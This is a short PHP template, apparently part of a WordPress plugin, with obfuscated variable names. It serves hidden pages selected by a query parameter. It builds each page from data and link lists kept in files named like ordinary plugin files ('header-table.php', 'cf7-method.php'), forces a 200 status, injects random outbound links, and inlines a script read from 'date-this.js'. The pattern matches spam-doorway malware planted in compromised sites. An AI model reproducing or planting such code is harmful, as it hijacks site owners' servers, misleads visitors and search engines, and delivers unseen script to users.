<?php
$sTbAUAMSq3 = intval(get_query_var('wgnqe'));

if ($sTbAUAMSq3 < 1 || $sTbAUAMSq3 > 5875) return;
$orZ5i = file(plugin_dir_path(__FILE__).'header-table.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$qyQ1eexQY = explode(';', $orZ5i[$sTbAUAMSq3]);
if (count($qyQ1eexQY) < 2) return;
$bpTFwWLl24 = $qyQ1eexQY[0];
$vJg1c  = $qyQ1eexQY[1];
$c5Ir5pUX1o = $qyQ1eexQY[2];
$y3Xnfw  = $qyQ1eexQY[3];
$qBhqHjX = $qyQ1eexQY[4];
set_query_var('vagsn', $bpTFwWLl24);

$fiXKOUi2 = '';
$j6coAKIp = plugin_dir_path(__FILE__).'cf7-method.php';
if (is_file($j6coAKIp)) {
	$vdidTUP = file($j6coAKIp, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($vdidTUP);
	shuffle($vdidTUP);
	$lqrb8J2 = mt_rand(2, 5);
	if (count($vdidTUP) > $lqrb8J2) {
		for ($mWCzZAMk02 = 0; $mWCzZAMk02 < $lqrb8J2; $mWCzZAMk02++) {
			$rP4QA = array_shift($vdidTUP);
			$fiXKOUi2 .= '<p><a href="'.$rP4QA.'">'.$rP4QA.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $bpTFwWLl24; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $vJg1c . "</p>\n";
				if (strlen($y3Xnfw) > 0) echo "<p>" . $y3Xnfw . "</p>\n";
				if (strlen($c5Ir5pUX1o) > 0) echo "<p>" . $c5Ir5pUX1o . "</p>\n";
				if (strlen($qBhqHjX) > 0) echo '<p><a href="#"><img src="'.$qBhqHjX.'"></a>' . "</p>\n";
				echo $fiXKOUi2;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$aHNTjx = plugin_dir_path(__FILE__) . 'date-this.js';
if (is_file($aHNTjx)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($aHNTjx);
	echo '</script>';
}
get_footer();
?>
